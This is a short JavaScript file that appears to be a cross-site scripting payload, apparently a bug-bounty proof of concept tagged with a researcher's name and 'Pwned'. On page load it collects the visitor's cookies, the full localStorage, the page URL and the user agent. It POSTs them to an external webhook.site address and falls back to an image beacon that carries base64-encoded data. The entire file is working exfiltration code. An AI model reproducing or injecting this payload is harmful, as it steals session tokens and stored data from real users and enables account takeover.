



(async function() {
    const webhookURL = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site";
    
    const exfilData = {
        researcher: "Ramavath Gopi Nayak",
        status: "Pwned",
        captured_at: new Date().toISOString(),
        cookies: document.cookie || "No Cookies (HttpOnly?)",
        localStorage: JSON.stringify(localStorage),
        url: window.location.href,
        userAgent: navigator.userAgent
    };

    try {
        // డేటాను POST బాడీలో పంపుతున్నాం
        await fetch(webhookURL, {
            method: "POST",
            mode: "no-cors", 
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(exfilData)
        });
        
        // Backup: ఒకవేళ POST ఫెయిల్ అయితే GET ద్వారా పంపడానికి
        const backupImg = new Image();
        backupImg.src = webhookURL + "?data=" + btoa(JSON.stringify({url: window.location.href}));
        
    } catch (e) {
        console.log("Exfiltration failed, trying image beacon...");
    }
})();

